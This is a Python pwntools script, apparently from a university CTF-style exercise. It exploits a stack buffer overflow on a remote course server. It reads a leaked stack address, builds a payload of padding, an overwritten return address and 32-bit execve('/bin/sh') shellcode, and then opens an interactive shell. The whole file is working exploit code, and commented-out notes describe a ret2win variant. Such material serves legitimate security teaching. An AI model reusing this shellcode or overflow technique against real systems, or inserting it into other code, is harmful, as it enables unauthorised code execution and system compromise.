# Install pip3 and pwntools:
# sudo apt install python3-pip; pip3 install --user pwntools
# Here's a example script for this challenge:

from pwn import *
from shellcode import *
import sys

argv = sys.argv

local = False

if local:
	r = process("./shellcode")
else:
	r = remote("tpas.alunos.dcc.fc.up.pt", 5002)

s = r.recvuntil("> ")

r.sendline("2") # string length
s = r.recvuntil("DEBUG: stringA address ")
address = r.recvline().rstrip()
#print(len(address))
#print(" =>>>>> " + str(address))
#print(r.recvline())
#r.sendline("1")
#r.sendline("1")

#s = r.recvuntil("> ")

#print('oiiii')

#print(address)

#r.sendline("1") # string length
s = r.recvuntil("Give me the first string: ")

# Change 0 to the correct number of A's to rewrite the return address with the address you want to jump to
n = int(argv[1])

# Remember, we should always check what binary we are dealing with:
# $ file ret2win
# ret2win: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ee7de11974d30585071a95b25df3301cffdffece, not stripped
# 
# p32() -> converts an address to the string representation - 4 bytes
# Same as struct.pack("<I", 0x804863d)
#
# For 64 bit binaries, we can use p64() - 8 bytes

# we should get the address of the win function, using a disassembler, debugger, etc:
#win_function = p32(0x804863d)
# or we can just use pwntools:
#elf = ELF("./ret2win")
#win_function = elf.symbols["win"]

#win_function = 0x8040041

#shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
#print(int(address, 16))

#payload = shellcode + b'A' * (112) + p32(int(address, 16))
payload = ('A' * n).encode() + p32(int(address, 16) + (n + 4)) + shellcode
#payload = b'A' * n + p32(int(address, 16)) + (b'\x90' * 100) + shellcode.encode()

print(len(payload))

#print(bytes(payload, encoding="raw_unicode_escape"))

#sys.stdout.buffer.write(payload)

#r.interactive()

r.sendline(payload)

r.recvuntil("Give me the second string: ")

r.sendline(payload)

r.interactive()

#exit()
